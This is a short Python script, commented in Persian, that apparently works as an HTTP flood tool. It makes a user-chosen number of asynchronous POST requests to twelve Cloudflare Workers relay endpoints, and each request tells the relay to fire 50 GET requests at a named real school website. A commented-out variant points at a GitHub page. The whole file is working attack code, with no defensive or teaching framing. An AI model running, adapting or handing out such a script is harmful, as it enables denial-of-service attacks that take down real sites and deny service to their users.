import aiohttp
import asyncio
import json
import random
from time import sleep
##########################
# import nest_asyncio
# nest_asyncio.apply()


# درخواست تعداد دفعات را از کاربر بگیرید
num = input("req *100 : ")

# تعریف لیست URL ها
urls = [
    'https://das.nohese2505.workers.dev',
    'https://das2.nohese2505.workers.dev',
    'https://das3.nohese2505.workers.dev',
    'https://das4.nohese2505.workers.dev',

    'https://das.jesoga8027.workers.dev',
    'https://das2.jesoga8027.workers.dev',
    'https://das3.jesoga8027.workers.dev',
    'https://das4.jesoga8027.workers.dev',

    'https://das.f9cef2d559.workers.dev',
    'https://das2.f9cef2d559.workers.dev',
    'https://das3.f9cef2d559.workers.dev',
    'https://das4.f9cef2d559.workers.dev'
]


# داده‌های درخواست
# data = {
#     "user_agent": "Mozilla/5.0",
#     "method": "POST",
#     "url": "https://github.com/derv82/wifite",
#     "data": {
#         "exampleKey": "exampleValue"
#     },
#     "number": 100
# }

# # داده‌های درخواست
data = {
    "user_agent": "Mozilla/5.0",
    "method": "GET",
    "url": "http://sorooshsch.ir/GSchool/#/Mobile/Home",
    "number": 50
}


# هدرهای درخواست
headers = {
    'Content-Type': 'application/json'
}


print(data)
sleep(1.5)

# تابع ارسال درخواست HTTP
async def fetch(session, url, data, headers):
    try:
        async with session.post(url, headers=headers, data=json.dumps(data)) as response:
            text = await response.text()
            print(f"Response to {url} - status code: {response.status}")
            print(f"Response body: {text}")
    except aiohttp.ClientError as e:
        print(f"Error while sending request to {url}: {e}")
    except asyncio.TimeoutError:
        print(f"Timeout while connecting to {url}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

# تابع اصلی برای مدیریت درخواست‌ها
async def main(num):
    timeout = aiohttp.ClientTimeout(total=30)  # افزایش زمان محدودیت به ۳۰ ثانیه
    connector = aiohttp.TCPConnector(limit_per_host=10)  # محدود کردن تعداد اتصالات همزمان به ۱۰
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for i in range(int(num)):
            # انتخاب یک URL به صورت تصادفی
            url = random.choice(urls)
            task = asyncio.create_task(fetch(session, url, data, headers))
            tasks.append(task)
            print(f'req number {i} send shod to {url} !')
        await asyncio.gather(*tasks)
        print('---end---')

# اجرای تابع اصلی
asyncio.run(main(num))

# await main(num)
